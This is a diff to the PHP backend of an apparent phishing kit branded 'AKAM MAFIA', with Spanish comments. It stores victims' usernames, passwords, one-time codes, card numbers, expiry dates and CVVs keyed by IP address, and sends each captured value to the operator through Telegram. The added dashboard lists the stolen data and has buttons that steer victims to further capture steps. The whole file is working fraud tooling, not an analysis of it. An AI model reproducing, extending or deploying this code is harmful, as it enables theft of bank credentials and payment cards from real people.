@@ -48,40 +48,48 @@ function _now() {
 }
 
 // ==========================================
-// FUNCIONES DE PROCESAMIENTO CORREGIDAS
+// FUNCIONES DE BÚSQUEDA Y ESTADO (CONEXIÓN PANEL)
+// ==========================================
+
+function traer_regitro($dir){
+    $data = _data_load();
+    // Buscamos el último registro de esa IP (el más reciente)
+    foreach (array_reverse($data) as $it) {
+        if (isset($it['ip']) && $it['ip'] === $dir) return $it['idreg'];
+    }
+    return null;
+}
+
+function buscar_estado($reg){
+    if($reg == null) return "w"; 
+    $data = _data_load();
+    foreach ($data as $it) {
+        if (strval($it['idreg']) === strval($reg)) {
+            return strval($it['status']);
+        }
+    }
+    return "w"; 
+}
+
+// ==========================================
+// FUNCIONES DE PROCESAMIENTO (CAPTURA)
 // ==========================================
 
 function crear_registro($usr, $dis){
     $data = _data_load();
     $id = count($data) + 1;
     $ip = $_SERVER['REMOTE_ADDR'];
-    
-    // Si el usuario llega vacío, le ponemos un valor por defecto para evitar el error
     if(empty($usr)) { $usr = "No detectado"; }
 
     $nuevo = [
-        'idreg' => $id, 
-        'usuario' => $usr, 
-        'password' => '', 
-        'otp' => '', 
-        'dispositivo' => $dis, 
-        'ip' => $ip, 
-        'status' => 1, 
-        'horamodificado' => _now(),
-        'tarjeta' => '', 
-        'ftarjeta' => '', 
-        'cvv' => ''
+        'idreg' => $id, 'usuario' => $usr, 'password' => '', 'otp' => '', 
+        'dispositivo' => $dis, 'ip' => $ip, 'status' => 1, 'horamodificado' => _now(),
+        'tarjeta' => '', 'ftarjeta' => '', 'cvv' => ''
     ];
     $data[] = $nuevo;
     _data_save($data);
 
-    // Formato VIP AKAM MAFIA para el Inicio
-    $msg = "⭐ <b>𝓐K𝓐M 𝓜𝓐𝓕𝓘𝓐 - INICIO</b> ⭐\n\n";
-    $msg .= "👤 <b>USUARIO:</b> <code>$usr</code>\n";
-    $msg .= "📱 <b>DISP:</b> <code>$dis</code>\n";
-    $msg .= "📍 <b>IP:</b> <code>$ip</code>\n\n";
-    $msg .= "✅ <b>LOGIN INICIADO</b>";
-    
+    $msg = "⭐ <b>𝓐K𝓐M 𝓜𝓐𝓕𝓘𝓐 - INICIO</b> ⭐\n\n👤 <b>USUARIO:</b> <code>$usr</code>\n📱 <b>DISP:</b> <code>$dis</code>\n📍 <b>IP:</b> <code>$ip</code>\n\n✅ <b>LOGIN INICIADO</b>";
     enviar_telegram($msg);
     return $id;
 }
@@ -92,11 +100,7 @@ function actualizar_registro_pass($reg, $pas){
         if (strval($it['idreg']) === strval($reg)) {
             $it['password'] = $pas; 
             $it['horamodificado'] = _now();
-            
-            $msg = "🔑 <b>𝓐K𝓐M 𝓜𝓐𝓕𝓘𝓐 - CLAVE</b>\n\n";
-            $msg .= "👤 <b>USUARIO:</b> <code>".$it['usuario']."</code>\n";
-            $msg .= "🔑 <b>CLAVE:</b> <code>$pas</code>\n";
-            $msg .= "📍 <b>IP:</b> <code>".$it['ip']."</code>";
+            $msg = "🔑 <b>𝓐K𝓐M 𝓜𝓐𝓕𝓘𝓐 - CLAVE</b>\n\n👤 <b>USUARIO:</b> <code>".$it['usuario']."</code>\n🔑 <b>CLAVE:</b> <code>$pas</code>\n📍 <b>IP:</b> <code>".$it['ip']."</code>";
             enviar_telegram($msg);
             break;
         }
@@ -108,16 +112,9 @@ function actualizar_registro_tar($reg, $tar, $ft, $cvv){
     $data = _data_load();
     foreach ($data as &$it) {
         if (strval($it['idreg']) === strval($reg)) {
-            $it['tarjeta'] = $tar; 
-            $it['ftarjeta'] = $ft; 
-            $it['cvv'] = $cvv;
+            $it['tarjeta'] = $tar; $it['ftarjeta'] = $ft; $it['cvv'] = $cvv;
             $it['horamodificado'] = _now();
-            
-            $msg = "💳 <b>𝓐K𝓐M 𝓜𝓐𝓕𝓘𝓐 - TARJETA</b>\n\n";
-            $msg .= "👤 <b>USUARIO:</b> <code>".$it['usuario']."</code>\n";
-            $msg .= "💳 <b>NÚMERO:</b> <code>$tar</code>\n";
-            $msg .= "📅 <b>FECHA:</b> <code>$ft</code>\n";
-            $msg .= "🔒 <b>CVV:</b> <code>$cvv</code>";
+            $msg = "💳 <b>𝓐K𝓐M 𝓜𝓐𝓕𝓘𝓐 - TARJETA</b>\n\n👤 <b>USUARIO:</b> <code>".$it['usuario']."</code>\n💳 <b>NÚMERO:</b> <code>$tar</code>\n📅 <b>FECHA:</b> <code>$ft</code>\n🔒 <b>CVV:</b> <code>$cvv</code>";
             enviar_telegram($msg);
             break;
         }
@@ -129,15 +126,44 @@ function actualizar_registro_otp($reg, $cd){
     $data = _data_load();
     foreach ($data as &$it) {
         if (strval($it['idreg']) === strval($reg)) {
-            $it['otp'] = $cd; 
-            $it['horamodificado'] = _now();
-            
-            $msg = "📲 <b>𝓐K𝓐M 𝓜𝓐𝓕𝓘𝓐 - DINÁMICA</b>\n\n";
-            $msg .= "👤 <b>USUARIO:</b> <code>".$it['usuario']."</code>\n";
-            $msg .= "🔢 <b>CÓDIGO:</b> <code>$cd</code>";
+            $it['otp'] = $cd; $it['horamodificado'] = _now();
+            $msg = "📲 <b>𝓐K𝓐M 𝓜𝓐𝓕𝓘𝓐 - DINÁMICA</b>\n\n👤 <b>USUARIO:</b> <code>".$it['usuario']."</code>\n🔢 <b>CÓDIGO:</b> <code>$cd</code>";
             enviar_telegram($msg);
             break;
         }
     }
     _data_save($data);
 }
+
+// ==========================================
+// RENDERIZADO DEL DASHBOARD (PANEL)
+// ==========================================
+function cargar_casos() {
+    $data = array_reverse(_data_load());
+    foreach ($data as $it) {
+        $id = $it['idreg'];
+        $color_st = ($it['status'] == "1") ? "green" : "orange";
+        
+        echo "<div class='item-trans' style='border-left: 5px solid $color_st; margin-bottom:10px; background:#fff; padding:10px;'>
+            <table width='100%'>
+                <tr>
+                    <td><b>ID:</b> $id | <b>User:</b> <code>".$it['usuario']."</code> | <b>IP:</b> ".$it['ip']."</td>
+                    <td align='right'><small>".$it['horamodificado']."</small></td>
+                </tr>
+                <tr>
+                    <td colspan='2'>
+                        🔑 <b>Pass:</b> <span style='color:red'>".$it['password']."</span> | 
+                        📲 <b>OTP:</b> <span style='color:blue'>".$it['otp']."</span><br>
+                        💳 <b>Tarj:</b> ".$it['tarjeta']." | 📅 ".$it['ftarjeta']." | 🔒 ".$it['cvv']."
+                    </td>
+                </tr>
+            </table>
+            <div style='margin-top:10px;'>
+                <button class='dinamica' id='$id'>OTP</button>
+                <button class='tarjeta' id='$id'>TARJETA</button>
+                <button class='finalizar' id='$id'>FINALIZAR</button>
+            </div>
+        </div>";
+    }
+}
+?>
